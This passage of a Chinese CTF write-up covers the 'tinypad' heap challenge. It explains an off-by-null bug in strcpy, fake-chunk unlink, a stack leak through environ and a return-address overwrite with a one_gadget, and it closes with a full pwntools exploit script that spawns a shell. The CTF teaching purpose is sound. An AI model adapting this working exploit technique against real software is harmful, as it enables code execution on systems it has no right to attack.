第二点，地址偏移也是我们知道的，程序没有PIE保护，tinypad的地址就是0x602040，堆块地址我们已经泄露出来了
第三点，有一个比较明显的off by one的漏洞(off by
null),如前面所说，edit函数通过strcpy的方式来讲我们的输入拷贝回原来的堆块的。如果我们申请一个大小为0x18的堆块chunk1，将它用字母a全部填充满,紧贴着在它后面申请一个大小为0xf0的chunk2，然后对chunk1进行edit操作，再输入0x18个字母a回去。chunk2的prev_size位就被覆盖为0x00了。
第四点，我们可以对chunk1进行edit操作来对chunk2的prev_size位进行修改。这里需要注意的是，edit函数使用strcpy实现堆块修改的，strcpy遇到\x00会截断，所以一次只能修改一个字节为\x00。
chunk1中我们全部写入了字母a，最后的8个字母a需要被我们改写成OFFSET。我们需要写入多个\x00，这就说明我们需要执行多次edit操作来写入OFFSET。
第三点这一个过程的演示入下：
首先，chunk1 = malloc(0x18)，将chunk1全部填充为’a’。然后执行chunk2 =
malloc(0xf0)。此时的堆块内容如图所示：
然后，对chunk1进行edit操作，输入0x18个‘a’回去，此时堆块内容如图所示：
最后我们就可以把OFFSET写入chunk2的prev_size位了。然后我们就可以去构造fake_chunk了。
    offset = buf_addr + 0x100 - 0x602060
    alloc(0x18,'e' * 0x18)#idx1
    alloc(0xf0,'e' * 0xf0)#idx2
    alloc(0x100,'f' * 0xf8)#idx3
    alloc(0x100,'g' * 0x100)#idx4
    edit(1,'a' * 0x18) #覆盖idx2的preinuse
    len_of_zero = (18 - len(str(hex(offset))))/2 #需要覆盖的0的个数
    for i in range(len_of_zero):
    edit(1,'a' * (0x17 - i))
    edit(1,'a' * 0x10 + p64(offset))
构造fake_chunk时，我们需要向tinypad中写入数据。就需要利用到edit功能来先向tinypad的数据缓冲区中写入数据。根据再0x01中提到的方法，这里不再赘述，直接给予代码和注释。
    fake_chunk = 'd' * 0x20 + p64(0) + p64(0x101) + p64(0x602060) * 2 #构造fake_chunk到0x602060.绕过unlink第二个保护
    edit(2,fake_chunk)#write fake_chunk to tinypad
    delete(2) #我们不需要构造fakechunk's nextchunk的size位来绕过第一个保护,因为通过计算，这个需要我们构造的地方的值是chunk2的size，恰好就是0x100，所以不需要修改，也可以绕过unlink第一个保护
    payload2 = 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena_88) * 2
    edit(4,payload2)#成功free后，需要把合并后的堆块fd和bk修改为main_arena + 88
当我们再申请一个0xf8大小的堆块时，程序就会把tinypad+0x20处的地址返回给我们了。我们就可以修改从tinypad+0x20开始，0x100大小的数据，tinypad+0x100处存储了第一个堆块的size和ptr，tinypad+0x110处存储了第二个堆块的size和ptr。这两个堆块的ptr我们已经可以进行修改了。
由于malloc_hook处的值是0，我们无法通过edit的方式把onegadget写入malloc_hook(因为malloc_hook的strlen是0，无法读入数据)。那么我们就可以通过修改函数的返回地址为onegadget。
修改函数的返回地址需要把程序保存返回地址的位置的值修改掉。我们需要泄露栈地址。libc中有一个符号’environ’存储了栈中的一个地址。我们可以利用它来得到栈地址。
将chunk1的地址改成environ的地址，目的是通过show得到environ中的数据(一个栈地址)。将chunk2的地址改成保存chunk1的地址处的地址(0x602148)，目的是方便修改chunk1的指针值。
    environ_addr = libc_base + libc.sym['__environ']#得到environ的地址
    payload3 = 'a' * 0xd0 + p64(0x18) + p64(environ_addr) + p64(0x100) + p64(0x602148)
    alloc(0x100 - 8,payload3)#idx2，得到tinypad+0x20处的fake_chunk,并构造堆块上的内容，覆盖chunk1和chunk2的ptr
    p.recvuntil('CONTENT: ')
    stack_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))#得到environ中的栈地址
    ret_addr = stack_addr + 0x7ffd2bad3188 - 0x7ffd2bad3278#得到返回地址，这个偏移可以通过调试获得。
    log.success('stack_addr: %s' % hex(stack_addr))
    one_gadget_addr = libc_base + one_gadget[0]#onegadget地址
## 0x06 漏洞利用
到了最后一步了，我们获得了函数的返回地址ret_addr，刚才我们申请fake_chunk是修改了chunk1和chunk2的指针，chunk2中保留的是0x602148，正好是存储chunk1的指针的地方。因为libc和栈的其实地址一般都是0x7f，并且长度都是12个16进制数。所以这里我们可以直接通过edit
chunk2来修改chunk1的指针为ret_addr。最后再edit
chunk1，将返回地址处保留的值改成one_gadget。返回地址处原先保留的值也是一个以0x7f开头，长度是12个16进制数的地址。所以这里edit函数也可以实现我们想要的功能，不会因为长度问题截断。
全部写好后，我们输入Q，让程序退出，就能拿到shell了。
    edit(2,p64(ret_addr))#修改chunk1的指针为ret_addr
    edit(1,p64(one_gadget_addr))#将ret_addr中的值改成one_gadget
    p.recvuntil('(CMD)>>> ')
    p.sendline('Q')#程序退出，获得shell
    p.interactive()#进行交互操作
最后脚本执行的结果：
##
## 0x07 个人心得
这道题目我从开始到解出再到写完文章花了两天的时间，里面穿插了很多保护绕过的技术。通过不断的调试，不断分析问题才最后靠自己解出这道题目。这道题目加深了我对堆保护技术绕过的印象，也让我知道了一种可以泄露栈地址的方法，同时也加深了unlink的各种操作的理解。（这两天我还去复习了unlink的各种合并检查操作）。总之，堆是pwn的基础，打好基础，熟练掌握各种攻击方式，才能在比赛中熟练综合运用。
如果exp尝试失败，可能是环境原因，也有可能是堆的地址含有\x00被截断了。前者可以自行调试环境，后者可以多尝试几次。
## 0x08 exp
    from pwn import *
    p = process("./tinypad")
    libc = ELF("/home/wbohan/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so")
    context.log_level = 'debug'
    one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]
    def alloc(size, content):
    p.recvuntil("(CMD)>>> ")
    p.sendline("A")
    p.recvuntil("(SIZE)>>> ")
    p.sendline(str(size))
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(content)
    def delete(index):
    p.recvuntil("(CMD)>>> ")
    p.sendline("D")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(index))
    def edit(index, content):
    p.recvuntil("(CMD)>>> ")
    p.sendline("E")
    p.recvuntil("(INDEX)>>> ")
    p.sendline(str(index))
    p.recvuntil('CONTENT: ')
    retstr = p.recvuntil('\n')
    p.recvuntil("(CONTENT)>>> ")
    p.sendline(content)
    p.recvuntil("(Y/n)>>> ")
    p.sendline('Y')
    return retstr
    #1 leak heap addr and libc addr
    alloc(0x40,'a')#idx1
    alloc(0x40,'b')#idx2
    alloc(0x80,'c')#idx3
    alloc(0x18,'d')#idx4
    delete(2)#fastbin
    delete(1)#fastbin
    delete(3)#unsorted bin
    delete(4)
    p.recvuntil('CONTENT: ')
    buf_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))
    p.recvuntil('CONTENT: ')
    p.recvuntil('CONTENT: ')
    libc_base = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00')) - 0x7f8c12b7ab78 + 0x7f8c127b6000
    main_arena_88 = libc_base + 0x7f8c12b7ab78 - 0x7f8c127b6000
    log.success('buf_addr: %s' % hex(buf_addr))
    log.success('libc_base: %s' % hex(libc_base))
    #gdb.attach(p)
    #pause()
    #2
    offset = buf_addr + 0x100 - 0x602060
    log.success('offset: %s' % hex(offset))
    alloc(0x18,'e' * 0x18) #idx1
    alloc(0xf0,'e' * 0xf0)#idx2
    alloc(0x100,'f' * 0xf8)#idx3
    alloc(0x100,'g' * 0x100)#idx4
    len_of_zero = (18 - len(str(hex(offset))))/2
    edit(1,'a' * 0x18)#idx2 preinuse
    for i in range(len_of_zero):
    edit(1,'a' * (0x17 - i))
    edit(1,'a' * 0x10 + p64(offset))
    fake_chunk = 'd' * 0x20 + p64(0) + p64(0x101) + p64(0x602060) * 2
    edit(2,fake_chunk)#write fake_chunk to tinypad
    delete(2)
    payload2 = 'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena_88) * 2
    edit(4,payload2)
    environ_addr = libc_base + libc.sym['__environ']
    payload3 = 'a' * 0xd0 + p64(0x18) + p64(environ_addr) + p64(0x100) + p64(0x602148)
    alloc(0x100 - 8,payload3)#idx2
    p.recvuntil('CONTENT: ')
    stack_addr = u64(p.recvuntil('\n',drop = True).ljust(8,'\x00'))
    ret_addr = stack_addr + 0x7ffd2bad3188 - 0x7ffd2bad3278
    log.success('stack_addr: %s' % hex(stack_addr))
    one_gadget_addr = libc_base + one_gadget[0]
    edit(2,p64(ret_addr))
    edit(1,p64(one_gadget_addr))
    p.recvuntil('(CMD)>>> ')
    p.sendline('Q')
    p.interactive()